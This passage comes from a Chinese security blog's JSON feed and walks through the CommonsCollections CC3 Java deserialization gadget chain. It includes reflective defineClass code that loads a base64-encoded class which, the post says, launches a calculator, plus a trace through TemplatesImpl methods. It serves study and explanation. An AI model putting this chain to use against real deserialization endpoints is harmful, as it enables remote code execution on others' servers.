punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token class-name\">Field</span> iTransformers <span class=\"token operator\">=</span> aClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"iTransformers\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        iTransformers<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        iTransformers<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>transform<span class=\"token punctuation\">,</span>transformedMaps<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"完工\"><a class=\"anchor\" href=\"#完工\">#</a> 完工</h1>\n",
            "tags": [
                "网络安全",
                "JAVA安全",
                "反序列化"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/10/22/CC3/",
            "url": "http://zhyzhyzhy.cn/2022/10/22/CC3/",
            "title": "Java反序列化CommonsCollections篇(四)",
            "date_published": "2022-10-21T16:00:00.000Z",
            "content_html": "<p>测试环境</p>\n<pre><code>jdk8u161\nCommons Collections3.1\n</code></pre>\n<h1 id=\"cc3-链条分析\"><a class=\"anchor\" href=\"#cc3-链条分析\">#</a> CC3 链条分析</h1>\n<blockquote>\n<p>前面分析了 CC1 和 CC6, 可以看出，CC6 和 CC3 的区别在于入口类不一样，最后代码执行的点是一样的。如果目标对最后的代码执行点的类做了过滤，我们还能不能利用前半条链呢？答案是肯定的，这就需要利用另外一种方法了来加载想要执行的命令了，就是 利用 defineClass 进行动态字节码注入恶意类。（CC3 更像是 CC1 和 CC2 的结合）</p>\n</blockquote>\n<h2 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h2>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>了解<a href=\"https://zhyzhyzhy.cn/2022/10/20/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/\">类加载机制</a>有助于本次利用链的调试</p>\n<h2 id=\"defineclass\"><a class=\"anchor\" href=\"#defineclass\">#</a> defineClass</h2>\n<p>众所周知，java 编译器会将.java 文件编译成 jvm 可以识别的机器代码保存在.class 文件当中。正常情况下，java 会先调用 classLoader 去加载.class 文件，然后调用 loadClass 函数去加载对应的类名，返回一个 Class 对象。而 defineClass 提供了另外一种方法，从官方定义中可以看出，defineClass 可以从 byte [] 还原出一个 Class 对象，这种方法，在构造 java 反序列化利用和漏洞 poc 时，变得非常有用。</p>\n<h2 id=\"简单说一下-classloader\"><a class=\"anchor\" href=\"#简单说一下-classloader\">#</a> 简单说一下 ClassLoader</h2>\n<p>顾名思义，ClassLoader 的作用是将一个字节码文件转化为内存中的对象，实现过程分为三个方法：loadClass、findClass、defineClass。</p>\n<p>loadClass：从字节码.class 文件加载目标类的入口（字节码文件可以是本地文件资源、远程文件资源），在这个过程中会查找当前 ClassLoader 是否已经加载过这个类，如果没有加载过就会通过双亲委派机制让 parent 的 ClassLoader 尝试加载目标类。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> c <span class=\"token operator\">=</span> <span class=\"token function\">findLoadedClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>c <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">long</span> t0 <span class=\"token operator\">=</span> <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span><span class=\"token function\">nanoTime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>parent <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            c <span class=\"token operator\">=</span> parent<span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            c <span class=\"token operator\">=</span> <span class=\"token function\">findBootstrapClassOrNull</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ClassNotFoundException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">// ClassNotFoundException thrown if class not found</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">// from the non-null parent class loader</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>如果还不行就会调用 findClass 方法来决定加载目标类的方式，最后获得一段字节流交给 defineClass 处理。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>c <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token comment\">// If still not found, then invoke findClass in order</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token comment\">// to find the class.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">long</span> t1 <span class=\"token operator\">=</span> <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span><span class=\"token function\">nanoTime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    c <span class=\"token operator\">=</span> <span class=\"token function\">findClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>defineClass：将前面获得的字节流转换为一个对象</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">protected</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> b<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> off<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                                     <span class=\"token class-name\">ProtectionDomain</span> protectionDomain<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ClassFormatError</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    protectionDomain <span class=\"token operator\">=</span> <span class=\"token function\">preDefineClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> protectionDomain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token class-name\">String</span> source <span class=\"token operator\">=</span> <span class=\"token function\">defineClassSourceLocation</span><span class=\"token punctuation\">(</span>protectionDomain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> c <span class=\"token operator\">=</span> <span class=\"token function\">defineClass1</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> off<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">,</span> protectionDomain<span class=\"token punctuation\">,</span> source<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">postDefineClass</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> protectionDomain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"如何利用-defineclass\"><a class=\"anchor\" href=\"#如何利用-defineclass\">#</a> 如何利用 DefineClass</h2>\n<p>从上面可知 defineClass 是完成字节码到对象转换的关键，因此可以通过直接传入字节流经过 defineClass 方法创建对象。<br />\n先写一个恶意类编译出.class 文件，然后内容 base64 一下（代码基于 P 师傅漫谈修改，作用是弹计算器）</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Method</span> defineClass <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token class-name\">ClassLoader</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"defineClass\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                                        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>defineClass<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token class-name\">String</span> src <span class=\"token operator\">=</span> <span class=\"token string\">\"yv66vgAAADQAIQoACAASCgATABQIABUKABMAFgcAFwoABQA\"</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token string\">\"YBwAZBwAaAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1\"</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token string\">\"iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAFwE\"</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token string\">\"AClNvdXJjZUZpbGUBAAlDYWxjLmphdmEMAAkACgcAGwwAHAAdAQA\"</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token string\">\"IY2FsYy5leGUMAB4AHwEAE2phdmEvaW8vSU9FeGNlcHRpb24MACA\"</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token string\">\"ACgEABENhbGMBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5\"</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token string\">\"nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J\"</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token string\">\"1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGp\"</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token string\">\"hdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAc\"</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token string\">\"ACAAAAAAAAgABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAE\"</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token string\">\"ADAAAAAYAAQAAAAMACAANAAoAAQALAAAATwACAAEAAAASuAACEgO\"</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">\"2AARXpwAISyq2AAaxAAEAAAAJAAwABQACAAwAAAAWAAUAAAAGAAk\"</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token string\">\"ACQAMAAcADQAIABEACgAOAAAABwACTAcADwQAAQAQAAAAAgAR\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> code <span class=\"token operator\">=</span> <span class=\"token class-name\">Base64</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDecoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token class-name\">Class</span> hello <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">)</span>defineClass<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token class-name\">ClassLoader</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSystemClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    code<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    code<span class=\"token punctuation\">.</span>length</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">//        System.out.println(src);</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>hello<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"利用链流程\"><a class=\"anchor\" href=\"#利用链流程\">#</a> 利用链流程</h1>\n<p>和之前的思路一样，找到不同类的同名函数</p>\n<p><img data-src=\"https://s2.loli.net/2022/10/22/jXKkZmyMp6xrLnq.png\" alt=\"defineClass.png\" /></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">protected</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> b<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> off<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ClassFormatError</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> off<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>在这个 defineClass 方法中，我们找到了一处利用点 TemplatesImpl，继承类 Serializable 并且 defineClass 为默认作用域，在同一个包下就可以进行调用。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">TemplatesImpl</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Templates</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Serializable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">long</span> serialVersionUID <span class=\"token operator\">=</span> <span class=\"token number\">673094361519270707L</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">String</span> <span class=\"token constant\">DESERIALIZE_TRANSLET</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"jdk.xml.enableTemplatesImplDeserialization\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>有了出发点，还是老方法，一直找不同类的同名函数，一直到可以 readObject 执行处，注意一点就是，调用出必须满足我们下一步的调用条件，并且可控</p>\n<h2 id=\"templatesimpl\"><a class=\"anchor\" href=\"#templatesimpl\">#</a> TemplatesImpl</h2>\n<blockquote>\n<p>这个类是干什么的我也不清楚，但是没关系，并不影响我们调试代码</p>\n</blockquote>\n<p>我们已经知道，TemplatesImpl 的 defineClass 是可以作为入口点的，所以下一步就是查找那个地方调用了 TemplatesImpl 的 defineClass<br />\n<img data-src=\"https://s2.loli.net/2022/10/22/eXkZKhQnfDIEWVb.png\" alt=\"templatesImp_defineClass.png\" /></p>\n<blockquote>\n<p>defineTransletClasses 方法中调用了 defineClass (下面就不放查找图片了)</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">defineTransletClasses</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">throws</span> <span class=\"token class-name\">TransformerConfigurationException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 省略一下代码</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> classCount<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                <span class=\"token comment\">// 这里进行了调用</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                _class<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> loader<span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>_bytecodes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                <span class=\"token keyword\">final</span> <span class=\"token class-name\">Class</span> superClass <span class=\"token operator\">=</span> _class<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSuperclass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token comment\">// Check if this is the main class</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>superClass<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token constant\">ABSTRACT_TRANSLET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                    _transletIndex <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                    _auxClasses<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>_class<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _class<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>getTransletInstance 中调用了 defineTransletClasses</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token class-name\">Translet</span> <span class=\"token function\">getTransletInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">throws</span> <span class=\"token class-name\">TransformerConfigurationException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_name <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_class <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token function\">defineTransletClasses</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>newTransformer 中调用了 getTransletInstance，public 方法并且返回值为 Transformer，所以这里我们就可以停止了。</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">synchronized</span> <span class=\"token class-name\">Transformer</span> <span class=\"token function\">newTransformer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">throws</span> <span class=\"token class-name\">TransformerConfigurationException</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token class-name\">TransformerImpl</span> transformer<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        transformer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformerImpl</span><span class=\"token punctuation\">(</span><span class=\"token function\">getTransletInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _outputProperties<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            _indentNumber<span class=\"token punctuation\">,</span> _tfactory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_uriResolver <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            transformer<span class=\"token punctuation\">.</span><span class=\"token function\">setURIResolver</span><span class=\"token punctuation\">(</span>_uriResolver<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td 